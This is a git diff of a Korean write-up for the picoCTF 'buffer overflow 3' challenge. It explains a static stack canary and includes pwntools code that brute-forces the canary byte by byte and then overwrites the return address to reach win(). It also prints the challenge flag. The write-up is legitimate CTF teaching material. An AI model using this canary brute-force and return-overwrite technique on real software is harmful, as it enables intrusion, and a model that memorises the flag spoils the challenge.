@@ -1,10 +1,6 @@
 # [buffer overflow 3](https://play.picoctf.org/practice/challenge/260?category=6&originalEvent=70&page=2&search=)
 <br />
 
-- [#1. 카나리 찾기](#1-카나리-찾기)
-- [#2. 카나리 찾기](#2-카나리-우회)
-<br />
-
 **Description:**
 > Do you think you can bypass the protection and get the flag?
 <br />
@@ -114,7 +110,7 @@ vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linke
 문제를 풀기에 앞서 `checksec`으로 바이너리에 적용된 보호기법을 확인해보면, 스택 카나리는 비활성화되어 있습니다. 그러나 소스코드를 살펴보면, **`canary.txt` 에서 4바이트만큼 읽어와 해당 값을 스택 카나리처럼 활용하고 있음을 알 수 있습니다.**
 <br />
 
-카나리는 스택 스매싱 공격으로부터 이를 탐지하고 바이너리를 보호합니다. 구현된 스택 카나리는 버퍼보다 높은 주소에 있음을 알고 있고, `canary.txt`에서 **정적 데이터**를 4바이트 읽어와 사용합니다. 따라서 스택 버퍼오버플로우 취약점을 이용해서 카나리를 **무차별 대입 공격**으로 알아낼 수 있습니다.
+카나리는 스택 스매싱 공격으로부터 이를 탐지하고 바이너리를 보호합니다. 구현된 스택 카나리는 버퍼보다 높은 주소에 있음을 알고 있고, `canary.txt`에서 **정적 데이터**를 4바이트 읽어와 사용합니다. 따라서 스택 버퍼오버플로우 취약점을 이용해서 카나리를 **무차별 대입 공격**을 통해 알아낼 수 있습니다.
 ```bash
 |------ Low Address ------|
 |        count  0x4       | -> [ebp-0x94] ~ [ebp-0x91]
@@ -135,11 +131,8 @@ vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linke
 |------ High Address -----|
 ```
 카나리의 값을 하나씩 대입할 것이기에 정확한 오프셋을 알아야 합니다. 위 스택 구조로 버퍼에서부터 카나리까지의 오프셋은 `0x40` 인 것을 알 수 있습니다.
-
 <br />
 
-# 2. 카나리 우회
-무차별 대입 공격은 값을 대입했을 때, **프로그램의 결과에 따라 참과 거짓을 분별하여 값을 유출하는 공격 방식**입니다. 카나리를 오염시키면 프로그램은 **경고 문자열을 출력**하고, 강제 종료를 합니다.
 ```bash
 $ ./vuln
 How Many Bytes will You Write Into the Buffer?
@@ -147,7 +140,7 @@ How Many Bytes will You Write Into the Buffer?
 Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ***** Stack Smashing Detected ***** : Canary Value Corrupt!
 ```
-위 정보들을 가지고 페이로드를 작성할 수 있습니다. 
+무차별 대입 공격은 값을 **하나씩 입력하고 프로그램의 반응에 따라 참과 거짓을 분별하여 특정 값을 유추하는 공격 방식**입니다. 해당 바이너리는 카나리가 오염됐다고 판단되면 경고 메시지를 출력한 뒤, 프로그램을 즉시 종료를 합니다. 이러한 반응을 활용하여 카나리를 추출할 수 있습니다.
 
 ```python
 from pwn import *
@@ -168,7 +161,7 @@ for i in range(4):
             print(f"[+] Found Canary: {cnry}")
             break
 ```
-더미데이터로 카나리 직전까지 채우고, 프로그램의 반응을 기준으로 각 바이트(0x00~0xFF)를 순차적으로 대입합니다. 프로그램이 경고 문자열을 출력하지 않으면, 값을 누적하고 다음 바이트에 대입을 시도합니다. 이러한 과정을 총 4번 반복합니다.
+버퍼를 카나리 직전까지 채우고, 각 바이트(`0x00`~`0xFF`)를 하나씩 대입합니다. 경고 문자열이 출력되지 않으면, 그 값을 누적하고 다음 바이트에 대입을 시도합니다. 이러한 과정을 총 4번 반복합니다.
 
 ```bash
 $ python3 test2.py
@@ -179,6 +172,7 @@ $ python3 test2.py
 ```
 <br />
 
+# 2. 카나리 우회
 ```bash
 $ python3 -q
 >>> from pwn import *
@@ -227,6 +221,16 @@ p = remote(host, port)
 p.sendafter(b">", b"100\n")
 p.sendafter(b">", b"A"*0x40+cnry+b"B"*0x10+p32(0x8049336)) # win = 08049336
 p.interactive()
+```
+```bash
+$ python3 test.py
+[+] Found Canary: b'B'
+[+] Found Canary: b'Bi'
+[+] Found Canary: b'BiR'
+[+] Found Canary: b'BiRd'
+Ok... Now Where's the Flag?
+picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}
+$
 ```
 <br />
 
@@ -277,23 +281,6 @@ p.interactive()
 >send(p, flat({0x40:cnry}, {0x10:e.sym["win"]}))
 >p.interactive()
 >```
-<br />
-
-# FLAG
-```bash
-$ python3 test.py
-[+] Found Canary: b'B'
-[+] Found Canary: b'Bi'
-[+] Found Canary: b'BiR'
-[+] Found Canary: b'BiRd'
-Ok... Now Where's the Flag?
-picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}
-$
-```
-<br />
-
-> [!NOTE]
-> tqdm_ver
 >```bash
 >$ python3 test.py saturn.picoctf.net 52435
 >[+] Opening connection to saturn.picoctf.net on port 52435: Done
